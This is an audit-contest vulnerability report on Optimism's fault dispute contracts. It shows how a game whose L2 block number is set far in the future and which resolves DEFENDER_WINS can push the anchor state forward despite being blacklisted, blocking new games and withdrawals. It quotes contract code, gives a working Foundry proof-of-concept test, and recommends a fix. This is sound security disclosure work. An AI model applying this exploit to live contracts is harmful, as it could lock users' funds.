Delightful Gingerbread Carp

high

# Permanent DoS of withdrawals due to a blacklisted game's resolution

## Summary

An incorrectly resolved `FaultDisputeGame` can break any future game deployments, even if this incorrect `FaultDisputeGame` is blacklisted.

Users not being able to deploy games lead to DoS of withdrawals as these can't be proved.

The issue is due to a lack of "safety net" on the update of the minimum L2 block number used for games.

## Vulnerability Detail

During the deployment of a game, the L2 block number against which the root claim is proven is passed as argument.

The game initialization requires that this input L2 block number is greater than the most recent L2 block number for which a game has been resolved with `DEFENDER_WINS` (stored in the Anchor State Registry).

When a game initialized with a really high L2 block number resolves incorrectly to `DEFENDER_WINS`, all newly deployed games must at least use this high L2 block number that will not exist before years.


## Impact

Breaking a "Top-Level Invariants":
> - Users must be able to execute messages that have actually been sent and included in the state of the L2ToL1MessagePasser contract on the L2 blockchain. Users must not be permanently prevented from executing a valid message (temporary blocks are valid findings but less severe).

Users will not be able to create new games, so they will not be able to prove and execute withdrawals.

## Code Snippet & Scenario

### Context

The current L2 block number is: `100_000_234`.

The last L2 block number for which a game has resolved as `DEFENDER_WINS` is: `100_000_123`. It is stored in the `ANCHOR_STATE_REGISTRY`.

### Attacker part

An attacker creates and initializes a `FaultDisputeGame` through the [`DisputeGameFactory.create` function](https://github.com/sherlock-audit/2024-02-optimism-2024/blob/main/optimism/packages/contracts-bedrock/src/dispute/DisputeGameFactory.sol#L106-L107) with `100_000_000_000` as L2 block number encoded in `_extraData`.

[`FaultDisputeGame.initialize` ensures that the input L2 block number is greater than](https://github.com/sherlock-audit/2024-02-optimism-2024/blob/main/optimism/packages/contracts-bedrock/src/dispute/FaultDisputeGame.sol#L529-L539) the last L2 block number proven on L1 (see `@POC` comment):

```solidity
    function initialize() public payable virtual {
        // @POC: REDACTED

        // Grab the latest anchor root.
        (Hash root, uint256 rootBlockNumber) = ANCHOR_STATE_REGISTRY.anchors(GAME_TYPE); // @POC: get L2 rootBlockNumber

        // Should only happen if this is a new game type that hasn't been set up yet.
        if (root.raw() == bytes32(0)) revert AnchorRootNotFound();

        // Set the starting output root.
        startingOutputRoot = OutputRoot({ l2BlockNumber: rootBlockNumber, root: root });

        // Do not allow the game to be initialized if the root claim corresponds to a block at or before the
        // configured starting block number.
        if (l2BlockNumber() <= rootBlockNumber) revert UnexpectedRootClaim(rootClaim()); // @POC: ensure that provided l2BlockNumber is greater than rootBlockNumber

        // @POC: REDACTED
    }
```

This check will pass as `100_000_000_000 > 100_000_123`.

For the exploit to work, here two possible scenarios can happen:
- **Scenario 1**: offchain supervision of protocol automatically blacklists the deployed game before it is played (as it is irrelevant)
    - As it is blacklisted, the game will not be challenged and will resolve with `DEFENDER_WINS` but will not be usable in `OptimismPortal2`
- **Scenario 2**: protocol waits for the resolution before blacklisting
    - In this specific case, the assumption that *"An invalid claim is resolved as valid"* is made.
    - According to the Audit Handbook, this assumption is in scope of this contest, as states the following:

> Participants should assume that the games can resolve incorrectly and should confirm that key invariants hold nonetheless.

In both scenarios, the attacker's game resolves to `DEFENDER_WINS` but is not usable in `OptimismPortal2`.

During this `FaultDisputeGame` resolution, [the `resolve` function](https://github.com/sherlock-audit/2024-02-optimism-2024/blob/main/optimism/packages/contracts-bedrock/src/dispute/FaultDisputeGame.sol#L386) is called. [This function will call `ANCHOR_STATE_REGISTRY.tryUpdateAnchorState()`](https://github.com/sherlock-audit/2024-02-optimism-2024/blob/main/optimism/packages/contracts-bedrock/src/dispute/AnchorStateRegistry.sol#L59-L87).

```solidity
    function resolve() external returns (GameStatus status_) {
        // INVARIANT: Resolution cannot occur unless the game is currently in progress.
        if (status != GameStatus.IN_PROGRESS) revert GameNotInProgress();

        // INVARIANT: Resolution cannot occur unless the absolute root subgame has been resolved.
        if (!subgameAtRootResolved) revert OutOfOrderResolution();

        // Update the global game status; The dispute has concluded.
        status_ = claimData[0].counteredBy == address(0) ? GameStatus.DEFENDER_WINS : GameStatus.CHALLENGER_WINS;
        resolvedAt = Timestamp.wrap(uint64(block.timestamp));

        // Update the status and emit the resolved event, note that we're performing an assignment here.
        emit Resolved(status = status_);

        // Try to update the anchor state, this should not revert.
        ANCHOR_STATE_REGISTRY.tryUpdateAnchorState(); // @POC: Call to `ANCHOR_STATE_REGISTRY`
    }
```

In case the game status is `DEFENDER_WINS`, this Anchor State Registry will update the minimum L2 block number required for this game type. As the attacker has set `100_000_000_000` for this game, the minimum L2 block number will jump from `100_000_123` to `100_000_000_000`.

```solidity
    function tryUpdateAnchorState() external {
        // Grab the game and game data.
        IFaultDisputeGame game = IFaultDisputeGame(msg.sender);
        (GameType gameType, Claim rootClaim, bytes memory extraData) = game.gameData();

        // Grab the verified address of the game based on the game data.
        // slither-disable-next-line unused-return
        (IDisputeGame factoryRegisteredGame,) =
            DISPUTE_GAME_FACTORY.games({ _gameType: gameType, _rootClaim: rootClaim, _extraData: extraData });

        // Must be a valid game.
        require(
            address(factoryRegisteredGame) == address(game),
            "AnchorStateRegistry: fault dispute game not registered with factory"
        );

        // No need to update anything if the anchor state is already newer.
        if (game.l2BlockNumber() <= anchors[gameType].l2BlockNumber) {
            return;
        }

        // Must be a game that resolved in favor of the state.
        if (game.status() != GameStatus.DEFENDER_WINS) {
            return;
        }

        // Actually update the anchor state.
        anchors[gameType] = OutputRoot({ l2BlockNumber: game.l2BlockNumber(), root: Hash.wrap(game.rootClaim().raw()) });
    }
```

*Note that the blacklisting from the protocol doesn't impact this block number update mechanism.*

### Consequences

After this update in L2 block number, every newly deployed `FaultDisputeGame` must have a L2 block number greater than `100_000_000_000`.
This is due to the check in [`FaultDisputeGame.initialize` that was shown previously](https://github.com/sherlock-audit/2024-02-optimism-2024/blob/main/optimism/packages/contracts-bedrock/src/dispute/FaultDisputeGame.sol#L529-L539):

```solidity
    function initialize() public payable virtual {
        // @POC: REDACTED

        // Grab the latest anchor root.
        (Hash root, uint256 rootBlockNumber) = ANCHOR_STATE_REGISTRY.anchors(GAME_TYPE);

        // Should only happen if this is a new game type that hasn't been set up yet.
        if (root.raw() == bytes32(0)) revert AnchorRootNotFound();

        // Set the starting output root.
        startingOutputRoot = OutputRoot({ l2BlockNumber: rootBlockNumber, root: root });

        // Do not allow the game to be initialized if the root claim corresponds to a block at or before the
        // configured starting block number.
        if (l2BlockNumber() <= rootBlockNumber) revert UnexpectedRootClaim(rootClaim());

        // @POC: REDACTED
    }
```

`FaultDisputeGame` now require to be deployed with a L2 block number that will not exist before years.

Considering a 1 second time per block and the attack duration being a week (7 days), the current L2 block number has grown from `100_000_234` to `100_605_034`.

`100_000_000_000 - 1_605_034 = 99998394966`

Withdrawals will be locked during `99998394966` blocks. At a rate of 1 block per second, it represents 1,156,242 days or 3,167 years.


## Proof of Concept

The following unit test can be imported in `test/dispute/FaultDisputeGame.t.sol`:

```solidity
    function test_DoS_duringSeveralYears() public {
        // @POC: Initial configuration
        Claim legitRootClaim = Claim.wrap(bytes32(uint256(111111222222333333444444)));
        bytes memory _extraData = abi.encode(bytes32(uint256(100_000_123))); // @POC: Legit L2 Block Number
        FaultDisputeGame legitGame = FaultDisputeGame(payable(address(disputeGameFactory.create(GAME_TYPE, legitRootClaim, _extraData))));

        vm.warp(block.timestamp + 3 days + 12 hours + 1 seconds);
        legitGame.resolveClaim(0);
        assertEq(uint8(legitGame.resolve()), uint8(GameStatus.DEFENDER_WINS));

        // @POC: Start of Attack
        Claim attackerRootClaim = Claim.wrap(bytes32(uint256(111111222222333333444444)));
        bytes memory _attackExtraData = abi.encode(bytes32(uint256(100_000_000_000))); // @POC: Attacker's L2 Block Number
        FaultDisputeGame attackerGame = FaultDisputeGame(payable(address(disputeGameFactory.create(GAME_TYPE, attackerRootClaim, _attackExtraData))));

        // @POC: Here attacker's game gets blacklisted, but resolves `DEFENDER_WINS`
        vm.warp(block.timestamp + 3 days + 12 hours + 1 seconds);
        attackerGame.resolveClaim(0);
        assertEq(uint8(attackerGame.resolve()), uint8(GameStatus.DEFENDER_WINS));


        // @POC: New legit games are not deployable
        legitRootClaim = Claim.wrap(bytes32(uint256(5555666677778888)));
        _extraData = abi.encode(bytes32(uint256(100_000_127))); // @POC: Legit L2 Block Number
        vm.expectRevert(abi.encodePacked(UnexpectedRootClaim.selector, bytes32(uint256(5555666677778888)))); // @POC: Reverts because of the block number being too low
        legitGame = FaultDisputeGame(payable(address(disputeGameFactory.create(GAME_TYPE, legitRootClaim, _extraData))));
    }
```

## Tool used

Manual Review

## Recommendation

The L2 block number update in the Anchor State Registry can be set when games are valid and used in `OptimismPortal2.finalizeWithdrawalTransaction`.

This change in the workflow will mitigate the issue, because the update of the L2 block number will not be executed when the game is blacklisted due to an incorrect resolution. The issue would be mitigated by the existing airgap safety net.

*Note: No patch is provided as this fix requires heavy changes and testing.*


